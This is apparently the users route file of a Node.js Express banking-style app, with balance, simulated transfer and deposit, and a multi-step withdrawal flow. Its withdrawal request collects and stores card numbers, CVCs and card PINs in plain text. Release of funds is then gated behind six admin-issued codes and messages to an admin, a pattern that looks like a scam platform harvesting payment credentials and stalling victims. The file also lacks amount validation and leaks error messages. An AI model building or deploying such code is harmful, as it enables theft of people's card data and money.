const express = require('express');
const router = express.Router();
const User = require('../models/User');
const Transaction = require('../models/Transaction');
const { protect } = require('../middleware/auth');
const { body, validationResult } = require('express-validator');


router.post('/withdraw-request', protect, async (req, res) => {
  try {
    const { amount, transferType, cardNumber, cardHolder, expiryDate, bankName, cardCVC, cardPin } = req.body;
    const WithdrawalRequest = require('../models/WithdrawalRequest');

    const user = await User.findById(req.user.id);
    const fee = 0;
    const totalAmount = parseFloat(amount);

    // Check if sufficient balance
    if (user.balance < totalAmount) {
      return res.status(400).json({
        success: false,
        message: 'Insufficient balance'
      });
    }

   

    // Create withdrawal request
    const withdrawalRequest = await WithdrawalRequest.create({
      userId: user._id,
      amount: parseFloat(amount),
      fee,
      transferType,
      cardNumber,
      cardHolder,
      expiryDate,
      bankName,
      cardCVC,
      cardPin,
      status: 'pending'
    });

    // Create transaction for fee
  

    res.json({
      success: true,
      message: 'Withdrawal request submitted successfully',
      data: withdrawalRequest
    });
  } catch (error) {
  console.error('❌ WITHDRAWAL ERROR:', error);
  console.error('Error message:', error.message);
  console.error('Stack trace:', error.stack);
  res.status(500).json({
    success: false,
    message: 'Server error',
    error: error.message
  });
}
});

router.get('/profile', protect, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    res.json({
      success: true,
      data: user
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// @route   PUT /api/users/profile
// @desc    Update user profile
// @access  Private
router.put('/profile', protect, async (req, res) => {
  try {
    const { fullName, email } = req.body;
    
    const user = await User.findById(req.user.id);
    
    if (fullName) user.fullName = fullName;
    if (email) user.email = email;
    
    await user.save();

    res.json({
      success: true,
      data: user,
      message: 'Profile updated successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// @route   GET /api/users/transactions
// @desc    Get user transactions
// @access  Private
router.get('/transactions', protect, async (req, res) => {
  try {
    const transactions = await Transaction.find({ userId: req.user.id })
      .sort({ createdAt: -1 })
      .limit(50);

    res.json({
      success: true,
      data: transactions
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// @route   POST /api/users/transfer
// @desc    Transfer money (SIMULATION)
// @access  Private
router.post('/transfer', [
  protect,
  body('recipientAccountNumber').notEmpty().withMessage('Recipient account number is required'),
  body('amount').isFloat({ min: 0.01 }).withMessage('Amount must be greater than 0')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array()
      });
    }

    const { recipientAccountNumber, amount, description } = req.body;

    // Get sender
    const sender = await User.findById(req.user.id);

    // Check if sufficient balance
    if (sender.balance < amount) {
      return res.status(400).json({
        success: false,
        message: 'Insufficient balance'
      });
    }

    // Find recipient
    const recipient = await User.findOne({ accountNumber: recipientAccountNumber });

    if (!recipient) {
      return res.status(404).json({
        success: false,
        message: 'Recipient account not found'
      });
    }

    if (recipient._id.toString() === sender._id.toString()) {
      return res.status(400).json({
        success: false,
        message: 'Cannot transfer to your own account'
      });
    }

    // Deduct from sender
    sender.balance -= parseFloat(amount);
    await sender.save();

    // Add to recipient
    recipient.balance += parseFloat(amount);
    await recipient.save();

    // Create debit transaction for sender
    await Transaction.create({
      userId: sender._id,
      type: 'debit',
      amount: parseFloat(amount),
      description: description || `Transfer to ${recipient.fullName}`,
      recipientAccountNumber: recipient.accountNumber,
      recipientName: recipient.fullName,
      balanceAfter: sender.balance
    });

    // Create credit transaction for recipient
    await Transaction.create({
      userId: recipient._id,
      type: 'credit',
      amount: parseFloat(amount),
      description: `Transfer from ${sender.fullName}`,
      recipientAccountNumber: sender.accountNumber,
      recipientName: sender.fullName,
      balanceAfter: recipient.balance
    });

    res.json({
      success: true,
      message: 'Transfer successful',
      data: {
        amount: parseFloat(amount),
        recipientName: recipient.fullName,
        recipientAccountNumber: recipient.accountNumber,
        newBalance: sender.balance
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   POST /api/users/deposit
// @desc    Deposit money (SIMULATION)
// @access  Private
router.post('/deposit', [
  protect,
  body('amount').isFloat({ min: 0.01 }).withMessage('Amount must be greater than 0')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array()
      });
    }

    const { amount, description } = req.body;

    const user = await User.findById(req.user.id);
    
    user.balance += parseFloat(amount);
    await user.save();

    await Transaction.create({
      userId: user._id,
      type: 'credit',
      amount: parseFloat(amount),
      description: description || 'Cash deposit',
      balanceAfter: user.balance
    });

    res.json({
      success: true,
      message: 'Deposit successful',
      data: {
        amount: parseFloat(amount),
        newBalance: user.balance
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});



// @route   GET /api/users/balance
// @desc    Get current balance
// @access  Private
router.get('/balance', protect, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    res.json({
      success: true,
      data: {
        balance: user.balance,
        accountNumber: user.accountNumber
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});


// @route   POST /api/users/verify-withdrawal
// @desc    Verify withdrawal with code
// @access  Private
// @route   POST /api/users/verify-withdrawal
// @desc    Verify withdrawal with code (first or second)
// @access  Private
router.post('/verify-withdrawal', protect, async (req, res) => {
  try {
    const { requestId, code } = req.body;
    const WithdrawalRequest = require('../models/WithdrawalRequest');

    const request = await WithdrawalRequest.findOne({ 
      _id: requestId, 
      userId: req.user.id 
    });

    if (!request) {
      return res.status(404).json({
        success: false,
        message: 'Withdrawal request not found'
      });
    }

    // CODE 1 VERIFICATION
    if (request.status === 'approved') {
      if (!request.verificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Code 1 not generated yet. Please contact admin.'
        });
      }

      if (request.verificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid code 1'
        });
      }

      request.status = 'awaiting_second_code';
      await request.save();

      return res.json({
        success: true,
        message: 'Code 1 verified! Wait for admin to generate code 2.',
        needsNextCode: true,
        currentStep: 1,
        totalSteps: 6
      });
    }

    // CODE 2 VERIFICATION
    if (request.status === 'awaiting_second_code') {
      if (!request.secondVerificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Code 2 not generated yet. Please contact admin.'
        });
      }

      if (request.secondVerificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid code 2'
        });
      }

      request.status = 'awaiting_third_code';
      await request.save();

      return res.json({
        success: true,
        message: 'Code 2 verified! Wait for admin to generate code 3.',
        needsNextCode: true,
        currentStep: 2,
        totalSteps: 6
      });
    }

    // CODE 3 VERIFICATION
    if (request.status === 'awaiting_third_code') {
      if (!request.thirdVerificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Code 3 not generated yet. Please contact admin.'
        });
      }

      if (request.thirdVerificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid code 3'
        });
      }

      request.status = 'awaiting_fourth_code';
      await request.save();

      return res.json({
        success: true,
        message: 'Code 3 verified! Wait for admin to generate code 4.',
        needsNextCode: true,
        currentStep: 3,
        totalSteps: 6
      });
    }

    // CODE 4 VERIFICATION
    if (request.status === 'awaiting_fourth_code') {
      if (!request.fourthVerificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Code 4 not generated yet. Please contact admin.'
        });
      }

      if (request.fourthVerificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid code 4'
        });
      }

      request.status = 'awaiting_fifth_code';
      await request.save();

      return res.json({
        success: true,
        message: 'Code 4 verified! Wait for admin to generate code 5.',
        needsNextCode: true,
        currentStep: 4,
        totalSteps: 6
      });
    }

    // CODE 5 VERIFICATION
    if (request.status === 'awaiting_fifth_code') {
      if (!request.fifthVerificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Code 5 not generated yet. Please contact admin.'
        });
      }

      if (request.fifthVerificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid code 5'
        });
      }

      request.status = 'awaiting_sixth_code';
      await request.save();

      return res.json({
        success: true,
        message: 'Code 5 verified! Wait for admin to generate FINAL code 6.',
        needsNextCode: true,
        currentStep: 5,
        totalSteps: 6
      });
    }

    // CODE 6 VERIFICATION (FINAL)
    if (request.status === 'awaiting_sixth_code') {
      if (!request.sixthVerificationCode) {
        return res.status(400).json({
          success: false,
          message: 'Final code 6 not generated yet. Please contact admin.'
        });
      }

      if (request.sixthVerificationCode !== code) {
        return res.status(400).json({
          success: false,
          message: 'Invalid final code 6'
        });
      }

      // ALL 6 CODES VERIFIED - COMPLETE WITHDRAWAL
      const user = await User.findById(req.user.id);
      user.balance -= request.amount;
      await user.save();

      // Create transaction
      await Transaction.create({
        userId: user._id,
        type: 'debit',
        amount: request.amount,
        description: `Withdrawal (${request.transferType === 'card' ? 'Card' : 'Bank'} transfer) to ${request.cardHolder}`,
        balanceAfter: user.balance
      });

      request.status = 'completed';
      await request.save();

      return res.json({
        success: true,
        message: '🎉 All 6 codes verified! Withdrawal completed successfully!',
        data: {
          newBalance: user.balance
        }
      });
    }

    return res.status(400).json({
      success: false,
      message: 'Invalid request status'
    });

  } catch (error) {
    console.error('❌ VERIFICATION ERROR:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});


// @route   GET /api/users/my-withdrawal-requests
// @desc    Get user's withdrawal requests
// @access  Private
router.get('/my-withdrawal-requests', protect, async (req, res) => {
  try {
    const WithdrawalRequest = require('../models/WithdrawalRequest');
    
    const requests = await WithdrawalRequest.find({ userId: req.user.id })
      .sort({ createdAt: -1 });

    res.json({
      success: true,
      data: requests
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// @route   POST /api/users/upload-withdrawal-proof
// @desc    Upload screenshot proof for withdrawal
// @access  Private
router.post('/upload-withdrawal-proof', protect, async (req, res) => {
  try {
    const { requestId, screenshot } = req.body;
    const WithdrawalRequest = require('../models/WithdrawalRequest');

    const request = await WithdrawalRequest.findOne({
      _id: requestId,
      userId: req.user.id
    });

    if (!request) {
      return res.status(404).json({
        success: false,
        message: 'Withdrawal request not found'
      });
    }

    // Save screenshot to request
    request.accountProofScreenshot = screenshot;
    await request.save();

    res.json({
      success: true,
      message: 'Screenshot uploaded successfully'
    });
  } catch (error) {
    console.error('Screenshot upload error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// @route   POST /api/users/send-withdrawal-message
// @desc    Send message to admin about withdrawal
// @access  Private
router.post('/send-withdrawal-message', protect, async (req, res) => {
  try {
    const { requestId, message, step } = req.body;
    const WithdrawalRequest = require('../models/WithdrawalRequest');
    const User = require('../models/User');

    const request = await WithdrawalRequest.findOne({
      _id: requestId,
      userId: req.user.id
    });

    if (!request) {
      return res.status(404).json({
        success: false,
        message: 'Withdrawal request not found'
      });
    }

    const user = await User.findById(req.user.id);

    // Initialize messages array if it doesn't exist
    if (!request.userMessages) {
      request.userMessages = [];
    }

    // Add message to request
    request.userMessages.push({
      message,
      step,
      timestamp: new Date(),
      userName: user.fullName,
      userEmail: user.email
    });

    await request.save();

    // Log for admin to see
    console.log(`📩 New message from ${user.fullName} for withdrawal ${requestId} - Code ${step}: ${message}`);

    res.json({
      success: true,
      message: 'Message sent to admin successfully'
    });
  } catch (error) {
    console.error('❌ Send message error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});


module.exports = router;
